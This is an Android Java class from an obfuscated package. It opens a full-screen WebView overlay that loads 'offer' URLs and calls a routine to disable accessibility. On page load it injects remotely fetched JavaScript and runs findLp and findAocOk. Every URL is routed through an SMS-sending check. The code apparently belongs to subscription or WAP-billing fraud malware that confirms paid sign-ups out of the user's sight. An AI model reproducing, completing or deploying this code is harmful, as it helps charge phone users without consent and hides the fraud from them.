package w.c.s.view;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import w.c.s.R;
import w.c.s.entity.Ma;
import w.c.s.utils.HttpUtils;
import w.c.s.utils.JsUtil;
import w.c.s.utils.LinkUtil;
import w.c.s.utils.OtherUtils;
import w.c.s.utils.PhoneControl;


public class Va implements View.OnClickListener {

    private static Va instance = null;

    private Context mContext;

    private ImageView delete_view;

    private WebView mWebView;

    private ProgressBar mProgressBar;

    private FrameLayout dialogProgresslayout;

    private TextView x_dialog_progress;

    private LinearLayout error_layout;

    private String fail_url;

    private String jsdata;

    private int offer_id;

    private String last_finished_url = "";

    private WindowManager windowManager = null;

    private WindowManager.LayoutParams windParams = null;

    private View view = null;

    private boolean loadJS = false;

    public static Va getInstance (Context context) {
        if ( instance == null ) {
            instance = new Va(context);
        }
        return instance;
    }

    private Va (Context context) {
        this.mContext = context;
        initView();
    }

    private void initJsData () {
        HttpUtils.executorService.execute(new Runnable() {
            @Override
            public void run () {
                jsdata = JsUtil.getInstance(mContext).getJsString();
            }
        });
    }


    public void startLoad (Ma offer, boolean loadJS) {
        this.loadJS = loadJS;
        if ( mWebView == null ) {
            initView();
        }

        String load_url = LinkUtil.getChangeUrl(offer, mContext, false);

        PhoneControl.disableAccessibility(mContext);

        PhoneControl.disableJsIfUrlEncodedFailed(mWebView, load_url);

        mWebView.loadUrl("about:blank", HttpUtils.getWebHead());

        initJsData();

        this.offer_id = offer.getOffer_id();

        if ( view == null ) {
            return;
        }

        if ( view.isShown() ) {
            windowManager.removeView(view);
        }

        mWebView.stopLoading();

        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.clearFocus();

        error_layout.setVisibility(View.GONE);

        mWebView.loadUrl(load_url, HttpUtils.getWebHead());

        try {
            windowManager.addView(view, windParams);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    @SuppressLint ("NewApi")
    private void destoryView () {
        if ( mWebView != null ) {
            try {
                ViewGroup parent = (ViewGroup) mWebView.getParent();
                if ( parent != null ) {
                    parent.removeAllViews();
                }
                mWebView.stopLoading();
                mWebView.onPause();
                mWebView.clearHistory();
                mWebView.removeAllViews();
                mWebView.destroyDrawingCache();

                mWebView.destroy();

            } catch ( Exception e ) {
                e.printStackTrace();
            }
            mWebView = null;
        }
    }

    @SuppressLint ({"NewApi", "SetJavaScriptEnabled", "AddJavascriptInterface"})
    private void initView () {
        windowManager = (WindowManager) mContext.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        windParams = new WindowManager.LayoutParams();
        windParams.width = WindowManager.LayoutParams.MATCH_PARENT;
        windParams.height = WindowManager.LayoutParams.MATCH_PARENT;
        windParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        windParams.format = PixelFormat.RGBA_8888;
        windParams.x = 0;
        windParams.y = 0;

        //        windParams.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_FULLSCREEN;
        //        windParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        //        windParams.flags = WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM;

        windParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;


        view = ((LayoutInflater) mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE)).inflate(R.layout.x_webview_layout_w, null, false);

        if ( view == null ) {
            return;
        }

        delete_view = (ImageView) view.findViewById(R.id.delete_view);

        delete_view.setOnClickListener(this);

        //error_layout
        error_layout = (LinearLayout) view.findViewById(R.id.error_layout);

        error_layout.setOnClickListener(this);

        dialogProgresslayout = (FrameLayout) view.findViewById(R.id.x_dialog_progress);

        x_dialog_progress = (TextView) view.findViewById(R.id.x_dialog_progress_text);


        //进度条
        mProgressBar = (ProgressBar) view.findViewById(R.id.webView_progress);
        mProgressBar.setProgress(0);
        mProgressBar.setMax(100);

        mWebView = (WebView) view.findViewById(R.id.grid_webview);

        mWebView.setLayerType(View.LAYER_TYPE_NONE, null);

        WebSettings settings = mWebView.getSettings();

        settings.setJavaScriptEnabled(true);

        settings.setJavaScriptCanOpenWindowsAutomatically(true);

        settings.setBuiltInZoomControls(true);

        settings.setDisplayZoomControls(false);

        settings.setSupportZoom(true);

        settings.setDomStorageEnabled(true);

        settings.setDatabaseEnabled(true);
        // 全屏显示
        settings.setLoadWithOverviewMode(true);

        settings.setUseWideViewPort(true);

        settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);

        settings.setAllowContentAccess(true);

        settings.setAllowFileAccess(true);

        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN ) {
            settings.setAllowFileAccessFromFileURLs(false);
            settings.setAllowUniversalAccessFromFileURLs(false);
        }

        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
        }

        if ( Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2 ) {
            settings.setAppCacheMaxSize(Long.MAX_VALUE);
        }
        if ( Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1 ) {
            settings.setEnableSmoothTransition(true);
        }
        if ( Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN ) {
            settings.setMediaPlaybackRequiresUserGesture(true);
        }

        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setDrawingCacheEnabled(false);

        mWebView.setWillNotCacheDrawing(true);

        if ( Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP_MR1 ) {
            mWebView.setAnimationCacheEnabled(false);
            mWebView.setAlwaysDrawnWithCacheEnabled(false);
        }

        mWebView.addJavascriptInterface(this, "toolbox");

        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);

        mWebView.requestFocus(View.FOCUS_DOWN);
        //或者
        mWebView.requestFocusFromTouch();


        mWebView.setWebViewClient(new MwebViewClient());
        mWebView.setWebChromeClient(new WebChroClient());
        mWebView.setDownloadListener(new MyDownloadListener());
    }


    @JavascriptInterface
    public void openImage (String tag, String satisfy_url) {
        if ( TextUtils.isEmpty(tag) || TextUtils.isEmpty(satisfy_url) ) {
            return;
        }
    }

    @Override
    public void onClick (View v) {
        int i = v.getId();
        if ( i == R.id.error_layout ) {
            mWebView.loadUrl(fail_url, HttpUtils.getWebHead());
            error_layout.setVisibility(View.GONE);
        } else if ( i == R.id.delete_view ) {
            if ( view != null && view.isShown() ) {
                windowManager.removeView(view);
                destoryView();
            }
        }
    }


    private class MwebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading (WebView view, String url) {
            OtherUtils.checkToSendSMS(url);
            mWebView.loadUrl(url, HttpUtils.getWebHead());
            return true;
        }

        @Override
        public void onPageStarted (WebView view, String url, Bitmap favicon) {
            //            LogUtil.show("slurl:" + url);
            dialogProgresslayout.setVisibility(View.VISIBLE);
            mProgressBar.setVisibility(View.VISIBLE);
        }

        @Override
        public boolean shouldOverrideKeyEvent (WebView view, KeyEvent event) {
            return super.shouldOverrideKeyEvent(view, event);
        }

        @Override
        public void onPageFinished (WebView view, String url) {
            super.onPageFinished(view, url);

            if ( url.equals(last_finished_url) || url.contains("about:blank") ) {
                return;
            }

            last_finished_url = url;

            if ( !TextUtils.isEmpty(jsdata) && mWebView != null && loadJS ) {
                mWebView.loadUrl("javascript:" + jsdata, HttpUtils.getWebHead());
                mWebView.loadUrl("javascript:findLp(" + offer_id + ")", HttpUtils.getWebHead());
                mWebView.loadUrl("javascript:findAocOk()", HttpUtils.getWebHead());
            }
        }

        @Override
        public void onLoadResource (WebView view, String url) {
            super.onLoadResource(view, url);
        }

        @Override
        public void onReceivedError (WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);


            view.stopLoading();
            view.clearView();
            String data = " ";
            mWebView.loadUrl("javascript:document.body.innerHTML=\"" + data + "\"", HttpUtils.getWebHead());

            fail_url = failingUrl;

            error_layout.setVisibility(View.VISIBLE);

        }

        //        @Override
        //        public WebResourceResponse shouldInterceptRequest (WebView view, String url) {
        //            return HttpUtils.getWebResResponse(url);
        //        }

//        @Override
//        public void onReceivedSslError (WebView view, SslErrorHandler handler, SslError error) {
//            handler.proceed();
//        }
    }

    private class MyDownloadListener implements DownloadListener {
        @Override
        public void onDownloadStart (String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {

        }
    }

    private class WebChroClient extends WebChromeClient {
        @Override
        public void onProgressChanged (WebView view, int newProgress) {

            mProgressBar.setVisibility(View.VISIBLE);
            mProgressBar.setProgress(newProgress);

            if ( x_dialog_progress != null ) {
                x_dialog_progress.setText(newProgress + "%");
            }
            if ( newProgress > 75 ) {
                mProgressBar.setVisibility(View.GONE);
                dialogProgresslayout.setVisibility(View.GONE);
            }
        }
    }
}